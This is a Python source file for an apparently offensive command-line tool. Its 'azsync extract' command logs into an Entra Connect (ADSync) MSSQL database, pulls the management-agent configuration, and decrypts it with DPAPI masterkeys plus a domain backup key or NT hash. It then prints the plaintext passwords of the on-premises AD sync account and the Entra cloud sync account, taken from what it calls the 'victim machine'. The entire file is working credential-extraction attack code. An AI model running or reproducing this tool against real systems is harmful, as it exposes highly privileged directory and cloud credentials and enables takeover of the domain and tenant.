import typer

from ._shared import azsync_app, console, columns
from impacket.tds import MSSQL
from impacket.dpapi import (
    DPAPI_BLOB,
    MasterKeyFile,
    MasterKey,
    DomainKey,
    PRIVATE_KEY_BLOB,
    PVK_FILE_HDR,
    DPAPI_DOMAIN_RSA_MASTER_KEY,
    privatekeyblob_to_pkcs1,
    deriveKeysFromUserkey,
)
from Cryptodome.Cipher import PKCS1_v1_5
import re
import uuid
from base64 import b64decode
from entruder.utils import handle_cli_errors, render, OutputFormat, output_option


def _extract_xml_parameter(xml, name):
    if isinstance(xml, bytes):
        xml = xml.decode("utf-16-le", errors="ignore")
    m = re.search(
        rf'<parameter[^>]*\bname="{re.escape(name)}"[^>]*>(.*?)</parameter>',
        xml, re.DOTALL,
    )
    if not m:
        raise ValueError(f"{name} not found in configuration XML")
    return m.group(1).strip()


def _parse_private_config(private_config_xml):
    return (
        _extract_xml_parameter(private_config_xml, "forest-login-user"),
        _extract_xml_parameter(private_config_xml, "forest-login-domain"),
    )


def _all_xml_parameters(xml):
    if isinstance(xml, bytes):
        xml = xml.decode("utf-16-le", errors="ignore")
    return dict(re.findall(
        r'<parameter[^>]*\bname="([^"]+)"[^>]*>(.*?)</parameter>', xml, re.DOTALL))


def _find_sync_username(private_config_xml):
    """Locate the Entra cloud sync account UPN (Sync_<host>_<id>@<tenant>) in the
    Azure AD connector's plaintext config, independent of the parameter name."""
    if isinstance(private_config_xml, bytes):
        private_config_xml = private_config_xml.decode("utf-16-le", errors="ignore")
    if not private_config_xml:
        return None
    m = re.search(r'Sync_[^@<>"\s]+@[^<>"\s]+', private_config_xml)
    return m.group(0) if m else None


def _extract_aad_password(decrypted):
    """Pull the sync account password out of the decrypted Azure AD connector
    config. The parameter is normally 'Password'; fall back to any password-like
    parameter so a schema change across builds does not silently drop it."""
    try:
        return _extract_xml_parameter(decrypted, "Password")
    except ValueError:
        pass
    for name, value in _all_xml_parameters(decrypted).items():
        if "password" in name.lower():
            return value
    raise ValueError("Password not found in the decrypted Azure AD connector configuration")


def _fetch_aad_agent(mssql):
    """Return the Azure AD connector row from mms_management_agent. The AAD
    connector is an Extensible2 management agent; fall back to matching the
    tenant marker in case a build labels ma_type differently."""
    rows = mssql.batch(
        "SELECT private_configuration_xml, encrypted_configuration "
        "FROM mms_management_agent WHERE ma_type = 'Extensible2'")
    if rows:
        return rows[0]
    rows = mssql.batch(
        "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent")
    for row in rows or []:
        priv = row.get("private_configuration_xml")
        if isinstance(priv, bytes):
            priv = priv.decode("utf-16-le", errors="ignore")
        if priv and "onmicrosoft.com" in priv.lower():
            return row
    return None


def _parse_masterkey_file(masterkey_path):
    """Split a raw DPAPI masterkey file into its MasterKey and (optional)
    DomainKey sub-structures, mirroring impacket's examples/dpapi.py."""
    with open(masterkey_path, "rb") as f:
        data = f.read()

    mkf = MasterKeyFile(data)
    data = data[len(mkf):]

    mk = None
    if mkf["MasterKeyLen"] > 0:
        mk = MasterKey(data[:mkf["MasterKeyLen"]])
        data = data[len(mk):]

    data = data[mkf["BackupKeyLen"]:]
    data = data[mkf["CredHistLen"]:]

    dk = None
    if mkf["DomainKeyLen"] > 0:
        dk = DomainKey(data[:mkf["DomainKeyLen"]])

    return mk, dk


def _recover_masterkey(mk, dk, backup_key="", nthash="", sid=""):
    """Recover the raw DPAPI masterkey bytes, either from the user's nthash
    (+ SID) or from the domain's DPAPI backup private key."""
    if nthash:
        if mk is None:
            raise ValueError("Masterkey file has no MasterKey blob, cannot use --nthash")
        if not sid:
            raise ValueError("--sid is required alongside --nthash")
        nthash_bytes = bytes.fromhex(nthash.replace(":", ""))
        for candidate in deriveKeysFromUserkey(sid, nthash_bytes):
            decrypted = mk.decrypt(candidate)
            if decrypted is not None:
                return decrypted
        raise ValueError("Masterkey decryption failed, wrong nthash or SID")

    if dk is None:
        raise ValueError("Masterkey file has no DomainKey blob, cannot use --backup-key")
    with open(backup_key, "rb") as f:
        pvk_data = f.read()
    pvk = PRIVATE_KEY_BLOB(pvk_data[len(PVK_FILE_HDR()):])
    private_key = privatekeyblob_to_pkcs1(pvk)
    decrypted = PKCS1_v1_5.new(private_key).decrypt(dk["SecretData"][::-1], None)
    if decrypted is None:
        raise ValueError("Masterkey decryption failed, invalid domain backup key")
    domain_master_key = DPAPI_DOMAIN_RSA_MASTER_KEY(decrypted)
    return domain_master_key["buffer"][:domain_master_key["cbMasterKey"]]


def _decrypt_blob(masterkey_path, blob, entropy, backup_key="", nthash="", sid=""):
    mk, dk = _parse_masterkey_file(masterkey_path)
    key = _recover_masterkey(mk, dk, backup_key=backup_key, nthash=nthash, sid=sid)

    blob = b64decode(blob)
    if entropy:
        entropy = uuid.UUID(str(entropy)).bytes_le

    return DPAPI_BLOB(blob).decrypt(key, entropy=entropy)

@azsync_app.command("extract")
@handle_cli_errors
def azsync_extract(
        target: str = typer.Option("127.0.0.1", "-t", "--target", help="The IP address of the MSSQL server"),
        port: int = typer.Option(1433, "-r", "--port", help="port"),
        windows_auth: bool = typer.Option(False, "-w", "--windows-auth", help="Use Windows/NTLM authentication instead of SQL authentication"),
        username: str = typer.Option(..., "-u", "--username", help="Username of the associated user"),
        password: str = typer.Option(..., "-p", "--password", help="Password of the associated user"),
        domain: str = typer.Option(None, "-d", "--domain", help="Domain name"),
        masterkey: str = typer.Option(None, "-m", "--master-key", help="Path to the DPAPI master key file (must be acquired extracted from the victim machine)"),
        backup_key:  str = typer.Option(None, "-b", "--backup-key", help="Path to the DPAPI backupkey (must be acquired extracted from the victim machine)"),
        nthash:  str = typer.Option(None, "-n", "--nthash", help="NT hash of the masterkey owner, used with --sid (must be acquired extracted from the victim machine)"),
        sid: str = typer.Option(None, "-s", "--sid", help="SID of the masterkey owner, required alongside --nthash"),
        output: OutputFormat = output_option(),
):
    """Pull the ADSync configuration off an MSSQL Database containing an Entra Connect / ADSync install configuration. If provided DPAPI credentials the password will be further decrypted"""
    if windows_auth and not domain:
        domain = '.'
    mssql = MSSQL(target, port)
    mssql.connect()
    if not mssql.login('ADsync', username, password, domain=domain, useWindowsAuth=windows_auth):
        console.print("[bold red][-][/] Login failed")
        raise typer.Exit(code=1)

    server_config = mssql.batch("SELECT keyset_id, instance_id, entropy FROM mms_server_configuration")
    if not server_config:
        console.print("[bold red][-][/] No rows returned from mms_server_configuration")
        raise typer.Exit(code=1)

    man_agent = mssql.batch("SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'")
    if not man_agent:
        console.print("[bold red][-][/] No AD management agent found in mms_management_agent")
        raise typer.Exit(code=1)

    victim_user, victim_domain = _parse_private_config(man_agent[0].get("private_configuration_xml"))
    encrypted_blob = man_agent[0].get("encrypted_configuration")
    entropy = server_config[0].get("entropy")
    row = {
        "target": target,
        "keyset_id": server_config[0].get("keyset_id"),
        "instance_id": server_config[0].get("instance_id"),
        "entropy": entropy,
        "private_configuration_xml": victim_user,
        "encrypted_configuration": encrypted_blob,
    }
    render(console, f"ADSync configuration on {target}", columns.ADSYNC_CONFIG, row,
           output=output, xml_item_tag="adsync_config")

    if masterkey and (backup_key or nthash):
        decrypted = _decrypt_blob(masterkey, encrypted_blob, entropy, backup_key=backup_key, nthash=nthash, sid=sid)
        try:
            password = _extract_xml_parameter(decrypted, "forest-login-password")
        except ValueError:
            password = decrypted.decode("utf-16-le", errors="ignore").rstrip("\x00")
        console.print(f"[bold green][+][/] Recovered password for {victim_domain}\\{victim_user}: {password}")

    aad = _fetch_aad_agent(mssql)
    if not aad:
        console.print("[bold yellow][!][/] No Azure AD connector found; skipping Entra sync account")
    else:
        sync_user = _find_sync_username(aad.get("private_configuration_xml"))
        console.print(f"[bold green][+][/] Entra sync account: {sync_user or '(UPN not found in plaintext config)'}")
        if masterkey and (backup_key or nthash):
            sync_password = _extract_aad_password(
                _decrypt_blob(masterkey, aad.get("encrypted_configuration"), entropy,
                              backup_key=backup_key, nthash=nthash, sid=sid))
            console.print(f"[bold green][+][/] Recovered password for {sync_user or 'Entra sync account'}: {sync_password}")
        else:
            console.print("[bold yellow][!][/] Provide --master-key with --backup-key or --nthash/--sid to recover the sync account password")


